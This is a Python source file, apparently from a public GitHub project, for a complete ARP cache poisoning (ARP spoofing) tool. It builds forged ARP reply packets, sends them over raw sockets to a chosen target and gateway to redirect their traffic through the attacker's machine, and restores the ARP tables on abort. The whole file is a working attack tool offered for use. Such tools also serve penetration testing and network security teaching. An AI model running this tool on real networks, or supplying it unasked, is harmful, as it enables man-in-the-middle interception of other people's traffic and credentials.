#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
"""

import argparse
import re
import time
from itertools import count
from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW


class ARPPacket(object):
    ETHER_T = b'\x08\x06'  # Ethertype code of ARP (IETF RFC 7042)

    def __init__(self, attacker_mac: str, gateway_mac: str, target_mac: str,
                 gateway_ip: str, target_ip: str):
        self.gateway_ip = inet_aton(gateway_ip)
        self.target_ip = inet_aton(target_ip)
        self.attacker_mac = self.__mac_to_hex(attacker_mac)
        self.gateway_mac = self.__mac_to_hex(gateway_mac)
        self.target_mac = self.__mac_to_hex(target_mac)
        self.restore_arp_table: bool = False

    def __iter__(self):
        yield from (self.arp_pkt_to_gateway, self.arp_pkt_to_target)

    @staticmethod
    def __mac_to_hex(mac_address: str) -> bytes:
        """
        Transform a MAC address string from IEEE 802.3 standard to a
        byte sequence of hexadecimal values.
        Ex: 'AB:BC:CD:12:23:34' to b'\xab\xbc\xcd\x12#4'
        """
        return b''.join(bytes.fromhex(octet) for octet in
                        re.split('[:-]', mac_address))

    @property
    def arp_header(self):
        """Builds a byte-string representation of the ARP header of a
        packet as defined by IETF RFC 826."""
        hardware_address = b'\x00\x01'  # '\x00\x01' = Ethernet
        protocol_address = b'\x08\x00'  # '\x08\x00' = IP
        hardware_address_len = b'\x06'
        protocol_address_len = b'\x04'
        opcode = b'\x00\x02'            # '\x00\x02' = REPLY
        return b''.join((hardware_address, protocol_address,
                         hardware_address_len, protocol_address_len,
                         opcode))

    @property
    def eth_header_to_gateway(self):
        return self.gateway_mac + self.attacker_mac + self.ETHER_T

    @property
    def eth_header_to_target(self):
        return self.target_mac + self.attacker_mac + self.ETHER_T

    @property
    def arp_pkt_to_gateway(self):
        destination = self.target_mac if self.restore_arp_table is True \
            else self.attacker_mac
        return b''.join((self.eth_header_to_gateway, self.arp_header,
                         destination, self.target_ip,
                         self.gateway_mac, self.gateway_ip))

    @property
    def arp_pkt_to_target(self):
        destination = self.gateway_mac if self.restore_arp_table is True \
            else self.attacker_mac
        return b''.join((self.eth_header_to_target, self.arp_header,
                         destination, self.gateway_ip,
                         self.target_mac, self.target_ip))


class Spoofer(object):
    def __init__(self, interface: str, *, arp_packets):
        self.interface = interface
        self.arp_packets = arp_packets

    def execute(self, *, max_packets: int, interval: float):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            for packet_count in count(start=1):
                for packet in self.arp_packets:
                    sock.send(packet)
                time.sleep(interval)
                if packet_count == max_packets:
                    break


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""
    packets = ARPPacket(attacker_mac=args.attackermac, gateway_mac=args.gatemac,
                        target_mac=args.targetmac, gateway_ip=args.gateip,
                        target_ip=args.targetip)

    spoofer = Spoofer(interface=args.interface, arp_packets=packets)

    current_time = time.strftime("%H:%M:%S", time.localtime())
    print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
          'abort.'.format(current_time))
    try:
        spoofer.execute(max_packets=args.maxpackets, interval=args.interval)
    except KeyboardInterrupt:
        print('[!] Aborting ARP Spoofing attack...')
        print('    [+] Restoring target ARP tables to their previous states...')
        packets.restore_arp_table = True
        spoofer.arp_packets = packets
        spoofer.execute(max_packets=20, interval=1)
        raise SystemExit('    [+] ARP Spoofing attack terminated.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('--interval', type=float, default=0.5,
                        metavar='SECONDS',
                        help='Time to wait between transmission of each set of '
                             'ARP Cache Poisoning attack packets (defaults to '
                             '0.5 seconds).')
    parser.add_argument('--maxpackets', type=int, default=0, metavar='PACKETS',
                        help='The maximum number of packets to transmit to '
                             'the targets during the attack (defaults to 0 to '
                             'set an infinite number of packets).')
    cli_args = parser.parse_args()
    spoof(cli_args)
